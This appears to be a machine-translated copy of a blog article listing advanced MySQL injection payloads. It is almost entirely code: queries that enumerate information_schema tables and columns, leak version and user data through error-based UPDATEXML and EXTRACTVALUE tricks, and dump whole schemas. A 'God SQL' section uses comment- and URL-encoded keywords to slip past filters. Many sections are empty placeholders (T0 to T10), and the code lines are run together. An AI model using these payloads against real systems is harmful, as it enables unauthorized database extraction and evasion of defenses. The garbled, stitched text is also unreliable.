# 使用 Advanced SQL Payloads

> 原文：<https://medium.com/nerd-for-tech/advanced-sql-payloads-5af8f924865b?source=collection_archive---------16----------------------->

![](img/ed7cdb117c43ac91edcb44d582629809.png)

# 使用 sql 函数的 SQL 注入

# 使用 RPAD 函数和 SOUNDS LIKE 的 Sql injection payload

(T0)

# Sql injection payload 使用 upper + reverse + right + sound like 提取信息

(T1 )

# 使用 ELT,双反向,hex 和 unhex 的 sql 注入

(T2 )

# Sql 注入案例

```
SELECT CASE WHEN (1=1) THEN table_name ELSE '<a href=https://twitter.com/_Y000_>_Y00!_</a>' END from information_schema.tablesSELECT CASE 4 WHEN 1 THEN database() WHEN 2 THEN @@version WHEN 3 THEN table_name ELSE '_Y000!_' END FROM information_schema.tablesSELECT CASE WHEN 1>0 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
```

# SQL IF 函数

```
SELECT IF(STRCMP('1','1'),'_Y000!_',table_name) FROM information_schema.tablesselect IF(MID(@@version,1,1)='5',table_name,'_Y000!_') from information_schema.tables
```

# SQL IFNULL

```
SELECT IFNULL(1+1/0,table_name) FROM information_schema.tables
```

# SQL NULLIF

```
SELECT NULLIF(table_name,2) from information_schema.tables
```

# Sql 注入有效负载(upper + reverse + right + sound like)

(T3 )

# SQL 注入使用双反向+right + if 陈述+HTML 注入

(T4 )

# 使用 HEX-UNHEX 函数的 Sql 注入

(T5 )

# SQL 注入类型基于错误,使用 Extractvalue

(T6 )

# Sql injection payload 使用反向

(T7 )

# 使用 extractvalue 的 Sql injection payload

(T8 )

# Sql injection payload + url encode + timing

(T9 )

# JSON 生成函数

```
select JSON_OBJECT(1, @@version)select json_array(current_user())select json_objectagg(1, @@datadir)select json_arrayagg('_Y000!_')
```

# 混合

```
select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))SELECT * FROM  information_schema.tables WHERE `table_name` REGEXP 'admin'SELECT IF(IFNULL(1/0,'a'),'NO',JSON_OBJECT(1, concat(table_name))) FROM  information_schema.tables WHERE `table_name` REGEXP 'admin'select UPDATEXML(1,CONCAT('.',1,(SELECT (ELT(1=1,2))),3),1)select UNHEX(HEX(lpad(table_name,50,'>'))) from information_schema.tablesSELECT TRIM(UpdateXML(table_name, '_Y000_', '1111')) FROM information_schema.tablesselect IF(IFNULL(0,'a'),'NO es nulo',JSON_OBJECT(1, concat(table_name))) FROM  information_schema.tablesSelect if(substring(@@version,'1','1') = "5", 'si', 'no')Select Unhex(hex(WEIGHT_STRING(table_name))) as 'tables' from information_schema.tables where table_name regexp '^[a | b]'select UNHEX(HEX(lpad(table_name,50,'>'))) from information_schema.tablesselect UPDATEXML(1,CONCAT('.',1,(SELECT (ELT(1=1,2))),3),1)SELECT TRIM(UpdateXML(table_name, '_Y000_', '1111')) FROM information_schema.tablesSELECT * FROM (SELECT count(*), CONCAT((select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@[@version](https://twitter.com/version)))), '_Y000!_')))), 0x23, FLOOR(RAND(0)*1)) AS x FROM information_schema.columns GROUP BY x) ySelect if(now()=sysdate(),(select table_name),0) from information_schema.tables
```

# SQL 注入 + 上帝 SQL

```
/*!u%6eion*/ /*!se%6cect*/+1,concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,'<br>',table_name,'::',column_name)),@),3..(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=information_schema)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,table_name,0x3c62723e))))x))
```

# Sql injection Buffer Overflow / Firewall Crash Bypass + xss injection

(T10)